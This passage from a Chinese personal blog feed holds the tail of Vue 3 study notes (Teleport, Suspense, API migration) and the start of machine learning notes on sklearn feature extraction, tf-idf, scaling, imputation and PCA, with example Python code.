减小内存占用</li></ul><h4 id="Teleport"><a href="#Teleport" class="headerlink" title="Teleport"></a>Teleport</h4><ul><li><p>什么是Teleport？—— <code>Teleport</code> 是一种能够将我们的<strong style="color:#DD5145">组件html结构</strong>移动到指定位置的技术。</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;teleport to&#x3D;&quot;移动位置&quot;&gt;&lt;div v-if&#x3D;&quot;isShow&quot; class&#x3D;&quot;mask&quot;&gt;&lt;div class&#x3D;&quot;dialog&quot;&gt;&lt;h3&gt;我是一个弹窗&lt;&#x2F;h3&gt;&lt;button @click&#x3D;&quot;isShow &#x3D; false&quot;&gt;关闭弹窗&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;&#x2F;div&gt;&lt;&#x2F;teleport&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="3-Suspense"><a href="#3-Suspense" class="headerlink" title="3.Suspense"></a>3.Suspense</h4><ul><li><p>等待异步组件时渲染一些额外内容，让应用有更好的用户体验</p></li><li><p>使用步骤：</p><ul><li><p>异步引入组件</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>defineAsyncComponent<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">const</span> Child <span class="token operator">=</span> <span class="token function">defineAsyncComponent</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./components/Child.vue'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>使用<code>Suspense</code>包裹组件，并配置好<code>default</code> 与 <code>fallback</code></p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;template&gt;&lt;div class&#x3D;&quot;app&quot;&gt;&lt;h3&gt;我是App组件&lt;&#x2F;h3&gt;&lt;Suspense&gt;&lt;template v-slot:default&gt;&lt;Child&#x2F;&gt;&lt;&#x2F;template&gt;&lt;template v-slot:fallback&gt;&lt;h3&gt;加载中.....&lt;&#x2F;h3&gt;&lt;&#x2F;template&gt;&lt;&#x2F;Suspense&gt;&lt;&#x2F;div&gt;&lt;&#x2F;template&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="全局API的转移"><a href="#全局API的转移" class="headerlink" title="全局API的转移"></a>全局API的转移</h4><ul><li><p>Vue 2.x 有许多全局 API 和配置。</p><ul><li><p>例如：注册全局组件、注册全局指令等。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//注册全局组件</span>Vue<span class="token punctuation">.</span><span class="token function">component</span><span class="token punctuation">(</span><span class="token string">'MyButton'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token function-variable function">data</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token literal-property property">template</span><span class="token operator">:</span> <span class="token string">'&lt;button @click="count++">Clicked &#123;&#123; count &#125;&#125; times.&lt;/button>'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//注册全局指令</span>Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token string">'focus'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token function-variable function">inserted</span><span class="token operator">:</span> <span class="token parameter">el</span> <span class="token operator">=></span> el<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>Vue3.0中对这些API做出了调整：</p><ul><li><p>将全局的API，即：<code>Vue.xxx</code>调整到应用实例（<code>app</code>）上</p><table><thead><tr><th>2.x 全局 API（<code>Vue</code>）</th><th>3.x 实例 API (<code>app</code>)</th></tr></thead><tbody><tr><td>Vue.config.xxxx</td><td>app.config.xxxx</td></tr><tr><td>Vue.config.productionTip</td><td><strong style="color:#DD5145">移除</strong></td></tr><tr><td>Vue.component</td><td>app.component</td></tr><tr><td>Vue.directive</td><td>app.directive</td></tr><tr><td>Vue.mixin</td><td>app.mixin</td></tr><tr><td>Vue.use</td><td>app.use</td></tr><tr><td>Vue.prototype</td><td>app.config.globalProperties</td></tr></tbody></table></li></ul></li></ul><h4 id="其他改变"><a href="#其他改变" class="headerlink" title="其他改变"></a>其他改变</h4><ul><li><p>data选项应始终被声明为一个函数。</p></li><li><p>过度类名的更改：</p><ul><li><p>Vue2.x写法</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.v-enter,.v-leave-to</span> <span class="token punctuation">&#123;</span>  <span class="token property">opacity</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.v-leave,.v-enter-to</span> <span class="token punctuation">&#123;</span>  <span class="token property">opacity</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Vue3.x写法</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.v-enter-from,.v-leave-to</span> <span class="token punctuation">&#123;</span>  <span class="token property">opacity</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.v-leave-from,.v-enter-to</span> <span class="token punctuation">&#123;</span>  <span class="token property">opacity</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong style="color:#DD5145">移除</strong>keyCode作为 v-on 的修饰符，同时也不再支持<code>config.keyCodes</code></p></li><li><p><strong style="color:#DD5145">移除</strong><code>v-on.native</code>修饰符</p><ul><li><p>父组件中绑定事件</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;my-component  v-on:close&#x3D;&quot;handleComponentEvent&quot;  v-on:click&#x3D;&quot;handleNativeClickEvent&quot;&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>子组件中声明自定义事件</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;script&gt;  export default &#123;    emits: [&#39;close&#39;]  &#125;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong style="color:#DD5145">移除</strong>过滤器（filter）</p><blockquote><p>过滤器虽然这看起来很方便，但它需要一个自定义语法，打破大括号内表达式是 “只是 JavaScript” 的假设，这不仅有学习成本，而且有实现成本！建议用方法调用或计算属性去替换过滤器。</p></blockquote></li></ul><p><strong>VUE学习至此结束</strong></p><p>接下来学习一下echarts图表的运用</p><h1 id="Echarts数据可视化"><a href="#Echarts数据可视化" class="headerlink" title="Echarts数据可视化"></a>Echarts数据可视化</h1><h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><p>分为几个步骤：</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web前端 </tag>
            
            <tag> VUE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>machine_learning记录</title>
      <link href="/2021/02/08/machine-learning/"/>
      <url>/2021/02/08/machine-learning/</url>
      
        <content type="html"><![CDATA[<p>因为大创要整深度学习，没办法来学习一下机器学习和深度学习，当然只是学怎么用怎么调包调参，<del>不会真有人搁那儿看数学吧</del>，真的对这方面不是很感兴趣，学习一下怎么用就好了，以后要整再说</p><h1 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h1><h2 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h2><p>对于机器学习来说特征是很重要的，只有利用特征工程将特征进行提取，才能更好的将其用于机器学习模型的训练，很多时候特征工程才是提高机器学习准确率的重要步骤</p><p>对于特征工程，主要用到了sklearn库中的各个类及方法，对于中文的处理则用到了jieba中文分词库</p><h3 id="特征抽取"><a href="#特征抽取" class="headerlink" title="特征抽取"></a>特征抽取</h3><h4 id="count："><a href="#count：" class="headerlink" title="count："></a>count：</h4><p>当数据以字典形式保存时使用<strong>sklearn.feature_extraction</strong>中的DictVectorizer类来进行处理，使用其中的fit_transform方法，可以得到一个经过处理的sparse矩阵，</p><p>当数据以列表方式存储时使用<strong>sklearn.feature_extraction.text</strong>中的 CountVectorizer类来进行处理，也是使用了fit_transform方法，</p><p>对于中文的句子，我们使用jieba分词库，让其按照一定的中文词语特性进行分词（对于英文是以空格来区分每个单词，对于中文则使用jieba来将句子中的词语间加上空格达到分词效果）</p><p>具体用法如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>feature_extraction <span class="token keyword">import</span> DictVectorizer<span class="token comment">#特征抽取，导入包sklearn，Dicvectorizer是针对字典的特征处理类</span><span class="token keyword">from</span> sklearn<span class="token punctuation">.</span>feature_extraction<span class="token punctuation">.</span>text <span class="token keyword">import</span> CountVectorizer<span class="token comment">#对文本进行特征值化所用到的类</span><span class="token keyword">import</span> jieba<span class="token keyword">def</span> <span class="token function">dicextra</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    字典数据抽取    :return: NONE    """</span>    <span class="token comment">#实例化DictVectorizer对象</span>    <span class="token builtin">dict</span><span class="token operator">=</span>DictVectorizer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">#调用fit_transform方法进行字典数据特征抽取</span>    data<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token string">'city'</span><span class="token punctuation">:</span><span class="token string">'北京'</span><span class="token punctuation">,</span><span class="token string">'temperature'</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'city'</span><span class="token punctuation">:</span><span class="token string">'上海'</span><span class="token punctuation">,</span><span class="token string">'temperature'</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'city'</span><span class="token punctuation">:</span><span class="token string">'成都'</span><span class="token punctuation">,</span><span class="token string">'temperature'</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#传入字典列表,返回sparse矩阵</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">.</span>feature_names_<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">def</span> <span class="token function">textextra</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    对文本进行特征值化    :return: None    """</span>    cv<span class="token operator">=</span>CountVectorizer<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#实例化对象</span>    data<span class="token operator">=</span>cv<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"this is not our life，life like this"</span><span class="token punctuation">,</span><span class="token string">"This is about our future"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#传入的依然是可迭代的列表对象</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>toarray<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#将sparse矩阵转化为数组形式,进行标记，统计每一个词的出现次数(单个字母不统计)</span>    <span class="token comment">#中文默认不支持特征抽取，使用jieba进行分词，jieba返回词语生成器</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cv<span class="token punctuation">.</span>get_feature_names<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 打印特征名称</span><span class="token keyword">def</span> <span class="token function">cut_chinese_worlds</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    将中文句子利用jieba进行分词处理，返回列表，再将其转换为字符串，返回    :return: c1,c2,c3    """</span>    con1<span class="token operator">=</span><span class="token string">"最近对深度学习在视频任务中的应用做了个简单调研，切入点是视频目标检测，刚开始调研的时候很乐观，本想着作为研究课题继续研究，但是随着调研深入，到最后发现这个领域还是慎入，，，在这里把调研报告放出来吧。"</span>    con2<span class="token operator">=</span><span class="token string">"近些年来，深度卷积神经网络在图像目标检测领域迅速普及，而且相较于传统方法取得了很好的效果，基于深度学习的图像目标检测也逐渐合称为一个统一的深度网络框架。在图像目标检测任务取得了不错的效果后，深度学习又迁移到基于视频的目标检测任务上。"</span>    con3<span class="token operator">=</span><span class="token string">"目标检测是计算机视觉领域的一个经典的任务，是进行场景内容分析和理解等高级视觉任务的基本前提。视频中的目标检测任务更是和现实生活的需求贴近，现实生活中的智能视频监控、机器人导航等应用场景都需要对视频进行处理，对视频中的目标进行检测。"</span>    <span class="token comment">#字符串</span>    content1<span class="token operator">=</span>jieba<span class="token punctuation">.</span>cut<span class="token punctuation">(</span>con1<span class="token punctuation">)</span>    content2 <span class="token operator">=</span> jieba<span class="token punctuation">.</span>cut<span class="token punctuation">(</span>con2<span class="token punctuation">)</span>    content3 <span class="token operator">=</span> jieba<span class="token punctuation">.</span>cut<span class="token punctuation">(</span>con3<span class="token punctuation">)</span>    <span class="token comment">#返回的值是生成器类型，需要对其进行转换</span>    contents1<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>content1<span class="token punctuation">)</span>    contents2 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>content2<span class="token punctuation">)</span>    contents3 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>content3<span class="token punctuation">)</span>    <span class="token comment">#转换为列表格式</span>    c1<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>contents1<span class="token punctuation">)</span>    c2 <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>contents2<span class="token punctuation">)</span>    c3 <span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>contents3<span class="token punctuation">)</span>    <span class="token comment">#转换为字符串</span>    <span class="token keyword">return</span> c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token keyword">def</span> <span class="token function">chinese_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    中文进行特征值化，使用jieba    :return: None    """</span>    c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token operator">=</span>cut_chinese_worlds<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#c1,c2,c3都是字符串</span>    cv<span class="token operator">=</span>CountVectorizer<span class="token punctuation">(</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>cv<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span><span class="token punctuation">[</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cv<span class="token punctuation">.</span>get_feature_names<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>toarray<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    chinese_vec<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但这并不是进行特征值抽取的常用方法，这样的方法是对词频进行统计，即一个词出现的次数进行统计，在对一些在各种文章中出现频率高的词语比如“我们”，进行统计的话，可能会造成将两篇并不想干的文章划分到一起，</p><h4 id="tf-idf"><a href="#tf-idf" class="headerlink" title="tf-idf"></a>tf-idf</h4><p>tf：term frequency词频 ————-出现的次数</p><p>idf inverse document frequency 逆文档频率————–公式：log(总文档数量/该词出现的文档数)</p><p>重要性程度： tf*idf</p><p><strong>tf-idf主要思想：如果某个词或短语在一篇文章中出现的频率高且在其它文章中出现较少，则认为此词具有很好的类别区分能力，适合用来分类。</strong></p><p>tf-idf作用：用以评估一字词对于一个文件集或一个语料库中的期中一份文件的重要程度</p><p>使用<strong>sklearn.feaure_extraction.text.TFidfVectorizer</strong>类，</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">tf_idf_tran</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#进行tf-idf的特征值化</span>    c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token operator">=</span>cut_chinese_worlds<span class="token punctuation">(</span><span class="token punctuation">)</span>    tf<span class="token operator">=</span>TfidfVectorizer<span class="token punctuation">(</span><span class="token punctuation">)</span>    data<span class="token operator">=</span>tf<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span><span class="token punctuation">[</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>tf<span class="token punctuation">.</span>get_feature_names<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>toarray<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就可以得到一个用tf-idf得到的sparse矩阵，但其数值就是重要性程度tf*idf</p><p><img src="/images/image-20210210115715597.png" alt="image-20210210115715597"></p><p>tf-idf是及机器学习特征处理的重要部</p><h3 id="特征预处理"><a href="#特征预处理" class="headerlink" title="特征预处理"></a>特征预处理</h3><p>特征处理，<strong>通过特定的统计方法（数学方法）将数据转换成算法要求的数据</strong>对数据进行处理，两种特征预处理方式，一种是只对数据的特征大小进行修改，第二种事对特征的大小以及特征的数量进行修改</p><ul><li>数值型数据：标准处理<ol><li>归一化</li><li>标准化</li><li>缺失值</li></ol></li><li>类别新数据：one-hot编码<ul><li><strong>one hot编码是将类别变量转换为机器学习算法易于利用的一种形式的过程。</strong><ul><li>对于特征是类别的进行处理</li></ul></li></ul></li><li>时间类型：时间的切分</li></ul><p>预处理API：都在sklearn.preprocessing中</p><h4 id="归一化"><a href="#归一化" class="headerlink" title="归一化"></a>归一化</h4><p>特点：<strong>通过对原始数据进行变换把数据映射到（默认0-1）之间</strong>，公式：</p><p><img src="/images/image-20210215104732116.png"></p><p>使用API:sklearn.preprocessing.MinMaxScaler进行归一化处理，依然是先实例化MinMaxScaler再使用fit_transform进行转化</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">mm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    预处理归一化    :return: none    """</span>    mm<span class="token operator">=</span>MinMaxScaler<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#添加参数feature_range=(2,3)即可让默认区间改为2-3</span>    <span class="token comment">#实例化</span>    data<span class="token operator">=</span>mm<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当多个特征同等重要时就使用归一化进行处理，因为不同特征之间差距可能很大，比如特征一的范围是一万至十万，而特征二的范围是一到十，若二者同等重要，不进行归一化处理直接进行计算会让特征二的值几乎可以忽略不计，所以使用归一化使二者的影响程度到达统一水平</p><p><strong>归一化目的：使一个特征不会对最终结果造成更大影响</strong></p><p><strong>归一化缺点：对于异常点处理不是很好，异常点会对最大最小值造成很大影响，这种方法鲁棒性较差，只适合精确小数据场景</strong>（鲁棒性可简单理解为稳定性）</p><h4 id="标准化"><a href="#标准化" class="headerlink" title="标准化"></a>标准化</h4><p><img src="/images/image-20210215120109619.png"></p><p>标准化使用了平均值，与方差，不容易受到异常点的影响</p><p>对于归一化，如果异常点影响了最大值和最小值，就会对结果产生显著的影响</p><p>对于标准化，具有一定的数据量，少量异常点对平均值影响较小，对方差影响较小</p><p><strong>使用API：sklearn.preprosessing.StandardScaler</strong>,对数据进行处理</p><p><img src="/images/image-20210216112143507.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">ss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    预处理标准化,标准化缩放    :return: None    """</span>    ss<span class="token operator">=</span>StandardScaler<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#实例化</span>    data<span class="token operator">=</span>ss<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>标准化总结：在样本较多 的情况下比较稳定，适合现代嘈杂大数据场景</strong></p><p><strong><em>归一化和标准化用于数值型的数据处理，但并非所有的算法都会用到归一化和标准化，会具体有所区别</em></strong></p><h4 id="缺失值处理"><a href="#缺失值处理" class="headerlink" title="缺失值处理"></a>缺失值处理</h4><p>一般对缺失值处理是使用panda，但sklearn也有对确实值进行处理的模块，</p><p>对缺失值的处理一般有两种方法，删除和插补</p><ul><li>删除：如果每行或列确实数据达到一定标准，选择放弃整行或整列</li><li>插补：对缺失值填补如该行，改列的平均值或中位数，（一般按列填补）</li></ul><p>一般使用插补，因为如果数据不够多，删除数据会让数据更少</p><p><strong>使用API：sklearn.preprossing.Imputer</strong></p><p><img src="/images/image-20210216115445416.png"></p><p>在sklearn中缺失值的数据类型需要是np.nan(numpy)</p><p>imputetr类有三个参数，</p><ul><li>missing_value:缺失值，可以写成nan,NaN</li><li>strategy：插补值，mean意味着填补平均数</li><li>axis：以列或行填补，默认为0即列填补，1位行填补</li></ul><p>numpy数组中可以使用np.nan(NaN)来代替缺失值，属于float类型</p><p>如果是文件中的一些缺失值，可以替换成nan，通过np.array转化成float型的数组即可</p><h3 id="数据降维"><a href="#数据降维" class="headerlink" title="数据降维"></a>数据降维</h3><p><strong>维度：特征的数量</strong>，数据降维即减少特征的数量</p><h4 id="特征选择"><a href="#特征选择" class="headerlink" title="特征选择"></a>特征选择</h4><p>特征选择，即单纯的选择一部分的特征作为训练集特征，一些特征被舍去，特征在选择前或选择后可以改变值，也可以不改变值，但选择后的特征维数一定比之前小</p><p>特征选择的原因：</p><ul><li>冗余：部分特征的相关度高，容易消耗计算性能</li><li>噪声：部分特征对预测结果有影响</li></ul><p>特征选择主要方法：</p><ul><li><p>Filter(过滤式)：VarianceThreshold：对样本一特征的方差进行分析，指定方差的值进行筛选，即方差低于一定数值的特征会被删除，因为方差代表的该特征的稳定性，特征值过于接近就失去了分析的意义</p><ul><li>使用API：<strong>sklearn.feature_selection.VarianceThreshold</strong></li></ul><p><img src="/images/image-20210216161342365.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">vt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    特征选择，过滤式，对方差进行过滤    :return:None    """</span>    vt<span class="token operator">=</span>VarianceThreshold<span class="token punctuation">(</span>threshold<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">#实例化，参数threshold表示将方差低于1的特征删去</span>    data<span class="token operator">=</span>vt<span class="token punctuation">.</span>fit_transform<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">89</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">77</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">3.1</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#返回一个特征减少了的数组</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>threshold值需要依据具体情况来取</p></li><li><p>Embedded(嵌入式)：正则化，决策树</p></li><li><p>Wrapper(包裹式)（使用较少）</p></li><li><p>神经网络（有这样的功能，后续会记录到）</p></li></ul><h4 id="主成分分析-PCA"><a href="#主成分分析-PCA" class="headerlink" title="主成分分析(PCA)"></a>主成分分析(PCA)</h4><p>使用API：sklearn.decomposition</p><p>PCA:是一种分析，简化数据集的技术，目的是为了数据维度的压缩，尽可能的降低原数据的维数（复杂度），损失少量数据，作用是可以消减回归分析或者聚类分析中的特征数量。应用场景并不多，当特征数量达到上百个时可以考虑用PCA，除了降低数据的维数，也会对数据进行更改</p><p><img src="/images/image-20210217113128941.png"></p><p>其中参数n_components有两种格式，一种是0-1的小数，代表保留特征的百分比，一般为0.9-0.95之间，另一种是整数，即保留多少个特征。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    